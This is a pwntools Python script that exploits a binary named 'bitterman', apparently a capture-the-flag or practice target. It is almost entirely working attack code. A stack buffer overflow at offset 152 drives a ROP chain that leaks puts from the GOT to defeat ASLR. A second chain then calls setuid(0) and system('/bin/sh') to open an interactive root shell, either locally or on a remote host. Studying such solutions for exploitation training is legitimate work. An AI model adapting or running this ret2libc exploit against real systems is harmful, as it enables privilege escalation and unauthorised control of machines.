#!/usr/bin/python3
# -*- coding: utf-8 -*-
from pwn import *


def local(argv=[], *a, **kw):
    # Execute the target binary locally
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    # Connect to the process on the remote host
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


# Stage 0
# ELF Manipulation. Load the binary and set up pwntools for the correct architecture
log.info("Mapping binaries")
exe = context.binary = ELF('./bitterman')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1234)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

start = local if args.LOCAL else remote

io = start()

# Stage 1. Leak the offset
# gadget to leak = pop_rdi + got_puts + plt_puts + plt_main
# Create a ROP object which looks up symbols in the binary.
rop = ROP(exe)
rop.call(exe.sym.puts, [exe.got.puts])
rop.call(exe.sym.main)
log.info("Stage 1 ROP Chain:\n" + rop.dump())
# Offset to %rsp is 152.
payload = fit({152: rop.chain()})

# Interaction with the program
io.recvuntil("name?")
io.sendline("Daniel")
io.recvuntil("message:")
io.sendline("1024")
io.recvuntil("text:")
io.sendline(payload)
io.recvuntil("Thanks!")
# Leak puts@GOT location.
leaked_puts = u64((io.recv()[:8].strip().ljust(8, b'\x00')))
log.info(f'Leaked puts@GOT: {leaked_puts}')
log.info(f'puts@GLIBC: {hex(libc.sym.puts)}')

# Stage 2. Code Execution
# Gadget to code execution "pop_rdi + p64(0) + setuid_loc + pop_rdi + binsh_loc + system_loc"
# The second stage will be shorter because libc.address sets the offset and simplifies the search of *_loc.
libc.address = leaked_puts - libc.sym.puts
setuid = libc.sym.setuid
system = libc.sym.system
binsh = next(libc.search('/bin/sh\x00'.encode()))

log.info(f'offset@GLIBC: {hex(libc.address)}')
log.info(f'offset + setuid@GLIBC: {hex(setuid)}')
log.info(f'offset + system@GLIBC: {hex(system)}')
log.info(f'offset + binbash@LIBC: {hex(binsh)}')

rop2 = ROP(exe)
rop2.call(setuid, [0])
rop2.call(system, [binsh])
# Print the status of the ROP2 Chain
log.info("Stage 2 ROP Chain:\n" + rop2.dump())
# Create the payload chain.
payload2 = fit({152: rop2.chain()})

# Interaction with the program
io.sendline("Daniel")
io.recvuntil("message:")
io.sendline("1024")
io.recvuntil("text:")
io.sendline(payload2)
io.interactive()
